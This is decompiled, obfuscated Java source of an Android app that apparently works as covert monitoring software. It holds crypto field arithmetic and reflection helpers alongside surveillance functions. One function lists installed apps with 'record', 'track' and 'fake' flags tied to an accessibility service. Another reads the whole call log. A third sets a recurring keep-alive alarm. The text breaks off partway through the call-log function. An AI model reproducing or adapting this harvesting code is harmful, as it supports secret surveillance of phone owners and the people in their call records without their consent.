package defpackage;

import android.R;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.res.ColorStateList;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Outline;
import android.graphics.Path;
import android.graphics.PorterDuff;
import android.graphics.drawable.ColorDrawable;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.LayerDrawable;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.text.InputFilter;
import android.text.method.TransformationMethod;
import android.util.Base64;
import android.util.Log;
import com.mamimobi.AccessService;
import com.mamimobi.receiver.KAReceiver;
import io.nats.client.support.ApiConstants;
import io.nats.client.support.NatsConstants;
import io.nats.client.support.NatsJetStreamConstants;
import java.io.ByteArrayOutputStream;
import java.io.Closeable;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.GenericArrayType;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.ParameterizedType;
import java.lang.reflect.Type;
import java.lang.reflect.TypeVariable;
import java.lang.reflect.WildcardType;
import java.math.BigInteger;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Date;
import java.util.Iterator;
import java.util.Locale;
import kotlin.Result;
import kotlin.a;
import kotlin.coroutines.EmptyCoroutineContext;
import kotlin.uuid.Uuid;
import org.bouncycastle.crypto.CryptoServicePurpose;
import org.bouncycastle.crypto.digests.SHAKENativeDigest;
import org.json.JSONArray;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public abstract class qm {
    public static Method B;
    public static Method C;
    public static boolean D;
    public static bf0 g;
    public static final Type[] a = new Type[0];
    public static final wy0 b = new wy0("RESUME_TOKEN", 0);
    public static final int[] c = {-19, -1, -1, -1, -1, -1, -1, Integer.MAX_VALUE};
    public static final int[] d = {361, 0, 0, 0, 0, 0, 0, 0, -19, -1, -1, -1, -1, -1, -1, 1073741823};
    public static final wy0 e = new wy0("CLOSED_EMPTY", 0);
    public static final bf0 f = new bf0(null, null, null);
    public static final di h = new di(26);
    public static final int[] i = {-1, -1, 0, -1, -1, -1, -1, -2};
    public static final int[] j = {1, 0, -2, 1, 1, -2, 0, 2, -2, -3, 3, -2, -1, -1, 0, -2};
    public static final int[] k = {Integer.MAX_VALUE, -1, -1, -1, -1};
    public static final int[] l = {1, 1073741825, 0, 0, 0, -2, -2, -1, -1, -1};
    public static final int[] m = {-1, -1073741826, -1, -1, -1, 1, 1};
    public static final int[] n = {1, 0, 0, -1, -1, -1, -1};
    public static final int[] o = {1, 0, 0, -2, -1, -1, 0, 2, 0, 0, -2, -1, -1, -1};
    public static final int[] p = {-1, -1, -1, 1, 0, 0, -1, -3, -1, -1, 1};
    public static final long[] q = {2791191049453778211L, 2791191049453778402L, 6};
    public static final int[] r = {R.attr.interpolator, R.attr.duration, R.attr.startDelay, R.attr.matchOrder};
    public static final int[] s = {R.attr.resizeClip};
    public static final int[] t = {R.attr.transitionVisibilityMode};
    public static final int[] u = {R.attr.fadingMode};
    public static final int[] v = {R.attr.reparent, R.attr.reparentWithOverlay};
    public static final int[] w = {R.attr.slideEdge};
    public static final int[] x = {R.attr.transitionOrdering};
    public static final int[] y = {R.attr.minimumHorizontalAngle, R.attr.minimumVerticalAngle, R.attr.maximumAngle};
    public static final int[] z = {R.attr.patternPathData};
    public static final int[] A = {13, 41, 121, 337, 897, 2305};

    public static void A0(int i2, int[] iArr, int[] iArr2) {
        int[] iArr3 = new int[10];
        ma0.q0(iArr, iArr3);
        while (true) {
            j0(iArr3, iArr2);
            i2--;
            if (i2 <= 0) {
                return;
            } else {
                ma0.q0(iArr2, iArr3);
            }
        }
    }

    public static Type B(Type type, Class cls, Class cls2) {
        if (cls2 == cls) {
            return type;
        }
        if (cls2.isInterface()) {
            Class<?>[] interfaces = cls.getInterfaces();
            int length = interfaces.length;
            for (int i2 = 0; i2 < length; i2++) {
                Class<?> cls3 = interfaces[i2];
                if (cls3 == cls2) {
                    return cls.getGenericInterfaces()[i2];
                }
                if (cls2.isAssignableFrom(cls3)) {
                    return B(cls.getGenericInterfaces()[i2], interfaces[i2], cls2);
                }
            }
        }
        if (!cls.isInterface()) {
            while (cls != Object.class) {
                Class<?> superclass = cls.getSuperclass();
                if (superclass == cls2) {
                    return cls.getGenericSuperclass();
                }
                if (cls2.isAssignableFrom(superclass)) {
                    return B(cls.getGenericSuperclass(), superclass, cls2);
                }
                cls = superclass;
            }
        }
        return cls2;
    }

    public static void B0(Context context) {
        ((AlarmManager) context.getSystemService("alarm")).setAndAllowWhileIdle(0, System.currentTimeMillis() + 60000, PendingIntent.getBroadcast(context, 0, new Intent(context, (Class<?>) KAReceiver.class), 201326592));
    }

    public static final String C(Object obj) {
        return Integer.toHexString(System.identityHashCode(obj));
    }

    public static void C0(int[] iArr) {
        long j2 = (((long) iArr[0]) & 4294967295L) + 19;
        iArr[0] = (int) j2;
        long jA0 = j2 >> 32;
        if (jA0 != 0) {
            jA0 = fa0.a0(7, 1, iArr);
        }
        iArr[7] = (int) (((((long) iArr[7]) & 4294967295L) - 2147483648L) + jA0);
    }

    public static JSONArray D(Context context) {
        JSONArray jSONArray;
        JSONArray jSONArray2 = new JSONArray();
        PackageManager packageManager = context.getPackageManager();
        Iterator<ApplicationInfo> it = packageManager.getInstalledApplications(Uuid.SIZE_BITS).iterator();
        while (it.hasNext()) {
            ApplicationInfo next = it.next();
            Iterator<ApplicationInfo> it2 = it;
            if ((next.flags & 1) == 0) {
                try {
                    JSONObject jSONObject = new JSONObject();
                    JSONArray jSONArray3 = jSONArray2;
                    try {
                        String string = packageManager.getApplicationLabel(next).toString();
                        jSONObject.put("appName", string);
                        jSONObject.put("packageName", next.packageName);
                        jSONObject.put("isSytemApp", false);
                        if (p9.b(string)) {
                            jSONObject.put("recordState", false);
                            jSONObject.put("disableRecord", true);
                            jSONObject.put("isTrack", false);
                            jSONObject.put("disableTrack", true);
                        } else {
                            jSONObject.put("recordState", AccessService.Q0.contains(next.packageName));
                            jSONObject.put("disableRecord", false);
                            jSONObject.put("isTrack", AccessService.R0.contains(next.packageName));
                            jSONObject.put("disableTrack", false);
                        }
                        jSONObject.put("isFake", AccessService.S0.contains(next.packageName));
                        try {
                            PackageInfo packageInfo = packageManager.getPackageInfo(next.packageName, 0);
                            jSONObject.put("createTime", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(packageInfo.firstInstallTime)));
                            jSONObject.put("updateTime", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(packageInfo.lastUpdateTime)));
                            Drawable drawableLoadIcon = packageInfo.applicationInfo.loadIcon(packageManager);
                            Bitmap bitmapCreateBitmap = Bitmap.createBitmap(24, 24, Bitmap.Config.ARGB_8888);
                            Canvas canvas = new Canvas(bitmapCreateBitmap);
                            drawableLoadIcon.setBounds(0, 0, 24, 24);
                            drawableLoadIcon.draw(canvas);
                            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                            bitmapCreateBitmap.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream);
                            jSONObject.put("icon", Base64.encodeToString(byteArrayOutputStream.toByteArray(), 0));
                        } catch (Exception unused) {
                        }
                        jSONArray2 = jSONArray3;
                        jSONArray2.put(jSONObject);
                    } catch (Exception unused2) {
                        jSONArray2 = jSONArray3;
                    }
                } catch (Exception unused3) {
                }
                jSONArray = jSONArray2;
            } else {
                JSONArray jSONArray4 = jSONArray2;
                try {
                } catch (Exception unused4) {
                    jSONArray = jSONArray4;
                }
                if ("com.android.systemui".equals(next.packageName) || "com.android.settings".equals(next.packageName)) {
                    JSONObject jSONObject2 = new JSONObject();
                    String string2 = packageManager.getApplicationLabel(next).toString();
                    jSONObject2.put("appName", string2);
                    jSONObject2.put("packageName", next.packageName);
                    jSONObject2.put("isSytemApp", true);
                    if (p9.b(string2)) {
                        jSONObject2.put("recordState", false);
                        jSONObject2.put("disableRecord", true);
                        jSONObject2.put("isTrack", false);
                        jSONObject2.put("disableTrack", true);
                    } else {
                        jSONObject2.put("recordState", AccessService.Q0.contains(next.packageName));
                        jSONObject2.put("disableRecord", false);
                        jSONObject2.put("isTrack", AccessService.R0.contains(next.packageName));
                        jSONObject2.put("disableTrack", false);
                    }
                    jSONObject2.put("isFake", AccessService.S0.contains(next.packageName));
                    try {
                        PackageInfo packageInfo2 = packageManager.getPackageInfo(next.packageName, 0);
                        jSONObject2.put("createTime", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(packageInfo2.firstInstallTime)));
                        jSONObject2.put("updateTime", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date(packageInfo2.lastUpdateTime)));
                        Drawable drawableLoadIcon2 = packageInfo2.applicationInfo.loadIcon(packageManager);
                        Bitmap bitmapCreateBitmap2 = Bitmap.createBitmap(24, 24, Bitmap.Config.ARGB_8888);
                        Canvas canvas2 = new Canvas(bitmapCreateBitmap2);
                        drawableLoadIcon2.setBounds(0, 0, 24, 24);
                        drawableLoadIcon2.draw(canvas2);
                        ByteArrayOutputStream byteArrayOutputStream2 = new ByteArrayOutputStream();
                        bitmapCreateBitmap2.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream2);
                        jSONObject2.put("icon", Base64.encodeToString(byteArrayOutputStream2.toByteArray(), 0));
                    } catch (Exception unused5) {
                    }
                    jSONArray = jSONArray4;
                    try {
                        jSONArray.put(jSONObject2);
                    } catch (Exception unused6) {
                    }
                } else {
                    it = it2;
                    jSONArray2 = jSONArray4;
                }
            }
            jSONArray2 = jSONArray;
            it = it2;
        }
        return jSONArray2;
    }

    public static void D0(int[] iArr, int[] iArr2, int[] iArr3) {
        if (fa0.C0(iArr, iArr2, iArr3) != 0) {
            long j2 = (((long) iArr3[0]) & 4294967295L) - 19;
            iArr3[0] = (int) j2;
            long jY = j2 >> 32;
            if (jY != 0) {
                jY = fa0.y(7, 1, iArr3);
            }
            iArr3[7] = (int) ((4294967295L & ((long) iArr3[7])) + 2147483648L + jY);
        }
    }

    public static String E(long j2, Locale locale) {
        return h31.b("MMMd", locale).format(new Date(j2));
    }

    public static void E0(int[] iArr, int[] iArr2, int[] iArr3) {
        if (fa0.C0(iArr, iArr2, iArr3) != 0) {
            long j2 = (((long) iArr3[0]) & 4294967295L) - 1;
            iArr3[0] = (int) j2;
            long j3 = j2 >> 32;
            if (j3 != 0) {
                long j4 = j3 + (((long) iArr3[1]) & 4294967295L);
                iArr3[1] = (int) j4;
                j3 = j4 >> 32;
            }
            long j5 = (((long) iArr3[2]) & 4294967295L) + 1 + j3;
            iArr3[2] = (int) j5;
            long j6 = ((((long) iArr3[3]) & 4294967295L) - 1) + (j5 >> 32);
            iArr3[3] = (int) j6;
            long j7 = j6 >> 32;
            if (j7 != 0) {
                long j8 = j7 + (((long) iArr3[4]) & 4294967295L);
                iArr3[4] = (int) j8;
                long j9 = (j8 >> 32) + (((long) iArr3[5]) & 4294967295L);
                iArr3[5] = (int) j9;
                long j10 = (j9 >> 32) + (((long) iArr3[6]) & 4294967295L);
                iArr3[6] = (int) j10;
                j7 = j10 >> 32;
            }
            iArr3[7] = (int) (((4294967295L & ((long) iArr3[7])) - 1) + j7);
        }
    }

    public static s91 F(d0 d0Var) {
        t91 t91Var = (t91) gk.c.get(d0Var);
        s91 s91VarD = t91Var == null ? null : t91Var.d();
        if (s91VarD == null) {
            t91 t91Var2 = (t91) p91.b.get(d0Var);
            s91VarD = t91Var2 == null ? null : t91Var2.d();
            if (s91VarD == null) {
                t91 t91Var3 = (t91) zp0.b.get(d0Var);
                s91VarD = t91Var3 == null ? null : t91Var3.d();
            }
            if (s91VarD == null) {
                t91 t91Var4 = (t91) nz0.b.get(d0Var);
                s91VarD = t91Var4 == null ? null : t91Var4.d();
            }
            if (s91VarD == null) {
                t91 t91Var5 = (t91) m.b.get(d0Var);
                s91VarD = t91Var5 == null ? null : t91Var5.d();
            }
            if (s91VarD == null) {
                t91 t91Var6 = (t91) dr.b.get(d0Var);
                s91VarD = t91Var6 == null ? null : t91Var6.d();
            }
            if (s91VarD == null) {
                t91 t91Var7 = (t91) m10.b.get(d0Var);
                if (t91Var7 == null) {
                    return null;
                }
                return t91Var7.d();
            }
        }
        return s91VarD;
    }

    public static void F0(int[] iArr, int[] iArr2, int[] iArr3) {
        if (ma0.t0(iArr, iArr2, iArr3) != 0) {
            long j2 = (((long) iArr3[0]) & 4294967295L) - (4294967295L & ((long) (-2147483647)));
            iArr3[0] = (int) j2;
            if ((j2 >> 32) == 0) {
                return;
            }
            fa0.y(5, 1, iArr3);
        }
    }

    public static d0 G(String str) {
        d0 d0Var = null;
        if (str == null) {
            return null;
        }
        String strTrim = str.trim();
        if (strTrim.length() == 0) {
            return null;
        }
        int iIndexOf = strTrim.indexOf(32);
        if (iIndexOf > 0) {
            strTrim = strTrim.substring(iIndexOf + 1);
        }
        char cCharAt = strTrim.charAt(0);
        if (cCharAt >= '0' && cCharAt <= '2') {
            try {
                d0Var = new d0(strTrim);
            } catch (Exception unused) {
            }
        }
        return d0Var != null ? d0Var : z91.z(strTrim);
    }

    public static void G0(int[] iArr, int[] iArr2, int[] iArr3) {
        if (s90.b0(iArr, iArr2, iArr3) != 0) {
            long j2 = (((long) iArr3[0]) & 4294967295L) + 1;
            iArr3[0] = (int) j2;
            long j3 = j2 >> 32;
            if (j3 != 0) {
                long j4 = j3 + (((long) iArr3[1]) & 4294967295L);
                iArr3[1] = (int) j4;
                long j5 = (j4 >> 32) + (((long) iArr3[2]) & 4294967295L);
                iArr3[2] = (int) j5;
                j3 = j5 >> 32;
            }
            long j6 = ((4294967295L & ((long) iArr3[3])) - 1) + j3;
            iArr3[3] = (int) j6;
            if ((j6 >> 32) != 0) {
                fa0.y(7, 4, iArr3);
            }
        }
    }

    public static int H(em0 em0Var, BigInteger bigInteger, BigInteger bigInteger2) {
        if (bigInteger != null) {
            return bigInteger.bitLength();
        }
        if (em0Var == null) {
            return bigInteger2.bitLength();
        }
        kr krVarA = ((kb) em0Var).a();
        return krVarA == null ? bigInteger2.bitLength() : krVarA.d.bitLength();
    }

    public static final String H0(ui uiVar) {
        Object objM3constructorimpl;
        if (uiVar instanceof vo) {
            return uiVar.toString();
        }
        try {
            objM3constructorimpl = Result.m3constructorimpl(uiVar + '@' + C(uiVar));
        } catch (Throwable th) {
            objM3constructorimpl = Result.m3constructorimpl(a.a(th));
        }
        if (Result.m6exceptionOrNullimpl(objM3constructorimpl) != null) {
            objM3constructorimpl = uiVar.getClass().getName() + '@' + C(uiVar);
        }
        return (String) objM3constructorimpl;
    }

    public static Class I(Type type) {
        if (type instanceof Class) {
            return (Class) type;
        }
        if (type instanceof ParameterizedType) {
            Type rawType = ((ParameterizedType) type).getRawType();
            j31.j(rawType instanceof Class);
            return (Class) rawType;
        }
        if (type instanceof GenericArrayType) {
            return Array.newInstance((Class<?>) I(((GenericArrayType) type).getGenericComponentType()), 0).getClass();
        }
        if (type instanceof TypeVariable) {
            return Object.class;
        }
        if (type instanceof WildcardType) {
            return I(((WildcardType) type).getUpperBounds()[0]);
        }
        throw new IllegalArgumentException("Expected a Class, ParameterizedType, or GenericArrayType, but <" + type + "> is of type " + (type == null ? "null" : type.getClass().getName()));
    }

    public static void I0(int[] iArr, int[] iArr2) {
        fa0.v0(8, 0, iArr, iArr2);
        if (fa0.U(iArr2, c)) {
            C0(iArr2);
        }
    }

    public static q00 J(p50 p50Var, SQLiteDatabase sQLiteDatabase) {
        t40.n(p50Var, "refHolder");
        q00 q00Var = (q00) p50Var.F;
        if (q00Var != null && q00Var.E.equals(sQLiteDatabase)) {
            return q00Var;
        }
        q00 q00Var2 = new q00(sQLiteDatabase);
        p50Var.F = q00Var2;
        return q00Var2;
    }

    public static void J0(int[] iArr, int[] iArr2) {
        if (fa0.v0(7, 0, iArr, iArr2) != 0 || (iArr2[6] == -1 && s90.z(iArr2, n))) {
            e(iArr2);
        }
    }

    public static String K(long j2, Locale locale) {
        return h31.b("yMMMd", locale).format(new Date(j2));
    }

    public static String K0(Type type) {
        return type instanceof Class ? ((Class) type).getName() : type.toString();
    }

    public static void L(long[] jArr, long[] jArr2, long[] jArr3) {
        long j2 = jArr[0];
        long j3 = jArr[1];
        long j4 = ((jArr[2] << 40) ^ (j3 >>> 24)) & 17592186044415L;
        long j5 = ((j2 >>> 44) ^ (j3 << 20)) & 17592186044415L;
        long j6 = j2 & 17592186044415L;
        long j7 = jArr2[0];
        long j8 = jArr2[1];
        long j9 = ((j8 >>> 24) ^ (jArr2[2] << 40)) & 17592186044415L;
        long j10 = ((j7 >>> 44) ^ (j8 << 20)) & 17592186044415L;
        long j11 = j7 & 17592186044415L;
        long[] jArr4 = new long[10];
        M(jArr3, j6, j11, jArr4, 0);
        M(jArr3, j4, j9, jArr4, 2);
        long j12 = (j6 ^ j5) ^ j4;
        long j13 = (j11 ^ j10) ^ j9;
        M(jArr3, j12, j13, jArr4, 4);
        long j14 = (j5 << 1) ^ (j4 << 2);
        long j15 = (j10 << 1) ^ (j9 << 2);
        M(jArr3, j6 ^ j14, j11 ^ j15, jArr4, 6);
        M(jArr3, j12 ^ j14, j13 ^ j15, jArr4, 8);
        long j16 = jArr4[6];
        long j17 = jArr4[8] ^ j16;
        long j18 = jArr4[7];
        long j19 = j18 ^ jArr4[9];
        long j20 = (j17 << 1) ^ j16;
        long j21 = (j17 ^ (j19 << 1)) ^ j18;
        long j22 = jArr4[0];
        long j23 = jArr4[1];
        long j24 = (j23 ^ j22) ^ jArr4[4];
        long j25 = j23 ^ jArr4[5];
        long j26 = jArr4[2];
        long j27 = ((j20 ^ j22) ^ (j26 << 4)) ^ (j26 << 1);
        long j28 = jArr4[3];
        long j29 = (((j24 ^ j21) ^ (j28 << 4)) ^ (j28 << 1)) ^ (j27 >>> 44);
        long j30 = (j25 ^ j19) ^ (j29 >>> 44);
        long j31 = ((j27 & 17592186044415L) >>> 1) ^ ((j29 & 1) << 43);
        long j32 = j31 ^ (j31 << 1);
        long j33 = j32 ^ (j32 << 2);
        long j34 = j33 ^ (j33 << 4);
        long j35 = j34 ^ (j34 << 8);
        long j36 = j35 ^ (j35 << 16);
        long j37 = (j36 ^ (j36 << 32)) & 17592186044415L;
        long j38 = (((j29 & 17592186044415L) >>> 1) ^ ((j30 & 1) << 43)) ^ (j37 >>> 43);
        long j39 = j38 ^ (j38 << 1);
        long j40 = j39 ^ (j39 << 2);
        long j41 = j40 ^ (j40 << 4);
        long j42 = j41 ^ (j41 << 8);
        long j43 = j42 ^ (j42 << 16);
        long j44 = 17592186044415L & (j43 ^ (j43 << 32));
        long j45 = (j30 >>> 1) ^ (j44 >>> 43);
        long j46 = j45 ^ (j45 << 1);
        long j47 = j46 ^ (j46 << 2);
        long j48 = j47 ^ (j47 << 4);
        long j49 = j48 ^ (j48 << 8);
        long j50 = j49 ^ (j49 << 16);
        long j51 = j50 ^ (j50 << 32);
        jArr3[0] = j22;
        long j52 = (j24 ^ j37) ^ j26;
        jArr3[1] = j52;
        long j53 = ((j25 ^ j44) ^ j37) ^ j28;
        jArr3[2] = j53;
        long j54 = j44 ^ j51;
        jArr3[3] = j54;
        long j55 = j51 ^ jArr4[2];
        jArr3[4] = j55;
        long j56 = jArr4[3];
        jArr3[5] = j56;
        jArr3[0] = j22 ^ (j52 << 44);
        jArr3[1] = (j52 >>> 20) ^ (j53 << 24);
        jArr3[2] = ((j53 >>> 40) ^ (j54 << 4)) ^ (j55 << 48);
        jArr3[3] = ((j54 >>> 60) ^ (j56 << 28)) ^ (j55 >>> 16);
        jArr3[4] = j56 >>> 36;
        jArr3[5] = 0;
    }

    public static long L0(long j2) {
        return l21.p(l21.p(l21.p(l21.p(l21.p(j2, 1, 2459565876494606882L), 2, 868082074056920076L), 4, 67555025218437360L), 8, 280375465148160L), 16, 4294901760L);
    }

    public static void M(long[] jArr, long j2, long j3, long[] jArr2, int i2) {
        jArr[1] = j3;
        long j4 = j3 << 1;
        jArr[2] = j4;
        long j5 = j4 ^ j3;
        jArr[3] = j5;
        long j6 = j3 << 2;
        jArr[4] = j6;
        jArr[5] = j6 ^ j3;
        long j7 = j5 << 1;
        jArr[6] = j7;
        jArr[7] = j7 ^ j3;
        int i3 = (int) j2;
        long j8 = (((jArr[i3 & 7] ^ (jArr[(i3 >>> 3) & 7] << 3)) ^ (jArr[(i3 >>> 6) & 7] << 6)) ^ (jArr[(i3 >>> 9) & 7] << 9)) ^ (jArr[(i3 >>> 12) & 7] << 12);
        long j9 = 0;
        int i4 = 30;
        do {
            int i5 = (int) (j2 >>> i4);
            long j10 = (((jArr[i5 & 7] ^ (jArr[(i5 >>> 3) & 7] << 3)) ^ (jArr[(i5 >>> 6) & 7] << 6)) ^ (jArr[(i5 >>> 9) & 7] << 9)) ^ (jArr[(i5 >>> 12) & 7] << 12);
            j8 ^= j10 << i4;
            j9 ^= j10 >>> (-i4);
            i4 -= 15;
        } while (i4 > 0);
        jArr2[i2] = 17592186044415L & j8;
        jArr2[i2 + 1] = (j8 >>> 44) ^ (j9 << 20);
    }

    public static void N(long[] jArr, long[] jArr2) {
        o(2, jArr, jArr2);
        int i2 = ((int) jArr[2]) & 255;
        int i3 = (i2 | (i2 << 4)) & 3855;
        int i4 = (i3 | (i3 << 2)) & 13107;
        jArr2[4] = ((long) ((i4 | (i4 << 1)) & 21845)) & 4294967295L;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:115:0x019e  */
    /* JADX WARN: Removed duplicated region for block: B:123:0x01b6  */
    /* JADX WARN: Removed duplicated region for block: B:126:0x01bf  */
    /* JADX WARN: Removed duplicated region for block: B:154:0x0207  */
    /* JADX WARN: Removed duplicated region for block: B:158:0x0211  */
    /* JADX WARN: Removed duplicated region for block: B:159:0x0215  */
    /* JADX WARN: Removed duplicated region for block: B:237:0x02c4  */
    /* JADX WARN: Removed duplicated region for block: B:246:0x02da A[ADDED_TO_REGION] */
    /* JADX WARN: Removed duplicated region for block: B:248:0x02de  */
    /* JADX WARN: Removed duplicated region for block: B:275:0x0105 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:27:0x0072  */
    /* JADX WARN: Removed duplicated region for block: B:281:0x016b A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:298:0x01c8 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:85:0x0153  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public static void N0(android.content.Context r18, java.util.concurrent.Executor r19, defpackage.xl0 r20, boolean r21) {
        /*
            Method dump skipped, instruction units count: 748
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: defpackage.qm.N0(android.content.Context, java.util.concurrent.Executor, xl0, boolean):void");
    }

    public static int P(int[] iArr) {
        int i2 = 0;
        for (int i3 = 0; i3 < 8; i3++) {
            i2 |= iArr[i3];
        }
        return (((i2 >>> 1) | (i2 & 1)) - 1) >> 31;
    }

    public static int Q(int[] iArr) {
        int i2 = 0;
        for (int i3 = 0; i3 < 8; i3++) {
            i2 |= iArr[i3];
        }
        return (((i2 >>> 1) | (i2 & 1)) - 1) >> 31;
    }

    public static int R(int[] iArr) {
        int i2 = 0;
        for (int i3 = 0; i3 < 5; i3++) {
            i2 |= iArr[i3];
        }
        return (((i2 >>> 1) | (i2 & 1)) - 1) >> 31;
    }

    public static int S(int[] iArr) {
        int i2 = 0;
        for (int i3 = 0; i3 < 7; i3++) {
            i2 |= iArr[i3];
        }
        return (((i2 >>> 1) | (i2 & 1)) - 1) >> 31;
    }

    public static bj T(zi ziVar, aj ajVar) {
        t40.n(ajVar, "key");
        return t40.f(ziVar.getKey(), ajVar) ? EmptyCoroutineContext.INSTANCE : ziVar;
    }

    public static void U(int[] iArr, int[] iArr2, int[] iArr3) {
        int[] iArr4 = new int[16];
        fa0.m0(iArr, iArr2, iArr4);
        g0(iArr4, iArr3);
    }

    public static void V(long[] jArr, long[] jArr2, long[] jArr3) {
        long[] jArr4 = new long[8];
        L(jArr, jArr2, jArr4);
        h0(jArr4, jArr3);
    }

    public static void W(int[] iArr, int[] iArr2, int[] iArr3) {
        int[] iArr4 = new int[16];
        fa0.m0(iArr, iArr2, iArr4);
        i0(iArr4, iArr3);
    }

    public static void X(int[] iArr, int[] iArr2, int[] iArr3) {
        int[] iArr4 = new int[10];
        ma0.W(iArr, iArr2, iArr4);
        j0(iArr4, iArr3);
    }

    public static void Y(int[] iArr, int[] iArr2, int[] iArr3) {
        int[] iArr4 = new int[14];
        s90.L(iArr, iArr2, iArr4);
        k0(iArr4, iArr3);
    }

    public static void Z(PackageInfo packageInfo, File file) {
        try {
            DataOutputStream dataOutputStream = new DataOutputStream(new FileOutputStream(new File(file, "profileinstaller_profileWrittenFor_lastUpdateTime.dat")));
            try {
                dataOutputStream.writeLong(packageInfo.lastUpdateTime);
                dataOutputStream.close();
            } finally {
            }
        } catch (IOException unused) {
        }
    }

    public static void a(int[] iArr, int[] iArr2, int[] iArr3) {
        if (fa0.b(iArr, iArr2, iArr3) != 0 || ((iArr3[7] >>> 1) >= Integer.MAX_VALUE && fa0.U(iArr3, i))) {
            d(iArr3);
        }
    }

    public static bj a0(bj bjVar, zi ziVar) {
        t40.n(bjVar, "context");
        return bjVar == EmptyCoroutineContext.INSTANCE ? ziVar : (bj) bjVar.fold(ziVar, jg.I);
    }

    public static void b(int[] iArr, int[] iArr2, int[] iArr3) {
        if (s90.h(iArr, iArr2, iArr3) != 0 || (iArr3[6] == -1 && s90.z(iArr3, n))) {
            e(iArr3);
        }
    }

    public static String b0(String str, BigInteger bigInteger, kr krVar) {
        StringBuffer stringBuffer = new StringBuffer();
        String str2 = jx0.a;
        or orVarO = z91.Q(krVar.c, bigInteger).o();
        stringBuffer.append(str);
        stringBuffer.append(" Private Key [");
        stringBuffer.append(q(orVarO, krVar));
        stringBuffer.append("]");
        stringBuffer.append(str2);
        stringBuffer.append("            X: ");
        orVarO.b();
        stringBuffer.append(orVarO.b.h1().toString(16));
        stringBuffer.append(str2);
        stringBuffer.append("            Y: ");
        stringBuffer.append(orVarO.e().h1().toString(16));
        stringBuffer.append(str2);
        return stringBuffer.toString();
    }

    public static void c(long[] jArr, long[] jArr2, long[] jArr3) {
        jArr3[0] = jArr[0] ^ jArr2[0];
        jArr3[1] = jArr[1] ^ jArr2[1];
        jArr3[2] = jArr[2] ^ jArr2[2];
        jArr3[3] = jArr[3] ^ jArr2[3];
        jArr3[4] = jArr2[4] ^ jArr[4];
    }

    public static String c0(String str, or orVar, kr krVar) {
        StringBuffer stringBuffer = new StringBuffer();
        String str2 = jx0.a;
        stringBuffer.append(str);
        stringBuffer.append(" Public Key [");
        stringBuffer.append(q(orVar, krVar));
        stringBuffer.append("]");
        stringBuffer.append(str2);
        stringBuffer.append("            X: ");
        orVar.b();
        stringBuffer.append(orVar.b.h1().toString(16));
        stringBuffer.append(str2);
        stringBuffer.append("            Y: ");
        stringBuffer.append(orVar.e().h1().toString(16));
        stringBuffer.append(str2);
        return stringBuffer.toString();
    }

    public static void d(int[] iArr) {
        long j2 = (((long) iArr[0]) & 4294967295L) + 1;
        iArr[0] = (int) j2;
        long j3 = j2 >> 32;
        if (j3 != 0) {
            long j4 = j3 + (((long) iArr[1]) & 4294967295L);
            iArr[1] = (int) j4;
            j3 = j4 >> 32;
        }
        long j5 = ((((long) iArr[2]) & 4294967295L) - 1) + j3;
        iArr[2] = (int) j5;
        long j6 = (((long) iArr[3]) & 4294967295L) + 1 + (j5 >> 32);
        iArr[3] = (int) j6;
        long j7 = j6 >> 32;
        if (j7 != 0) {
            long j8 = j7 + (((long) iArr[4]) & 4294967295L);
            iArr[4] = (int) j8;
            long j9 = (j8 >> 32) + (((long) iArr[5]) & 4294967295L);
            iArr[5] = (int) j9;
            long j10 = (j9 >> 32) + (((long) iArr[6]) & 4294967295L);
            iArr[6] = (int) j10;
            j7 = j10 >> 32;
        }
        iArr[7] = (int) ((4294967295L & ((long) iArr[7])) + 1 + j7);
    }

    public static JSONArray d0(Context context) {
        Cursor cursorQuery;
        JSONArray jSONArray = new JSONArray();
        if (t40.o(context, "android.permission.READ_CALL_LOG") == 0 && (cursorQuery = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC")) != null && cursorQuery.moveToFirst()) {
            do {
                try {
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put(ApiConstants.ID, cursorQuery.getString(cursorQuery.getColumnIndex("_id")));
                    jSONObject.put("number", cursorQuery.getString(cursorQuery.getColumnIndex("number")));
                    String string = cursorQuery.getString(cursorQuery.getColumnIndex(ApiConstants.NAME));
                    if (string == null) {
                        string = "未知";
                    }
                    jSONObject.put(ApiConstants.NAME, string);
                    int i2 = cursorQuery.getInt(cursorQuery.getColumnIndex(ApiConstants.TYPE));
                    jSONObject.put(ApiConstants.TYPE, i2 != 1 ? i2 != 2 ? i2 != 3 ? i2 != 5 ? i2 != 6 ? "其他" : "已拦截" : "已拒绝" : "未接" : "去电" : "来电");
                    jSONObject.put("duration", cursorQuery.getString(cursorQuery.getColumnIndex("duration")));
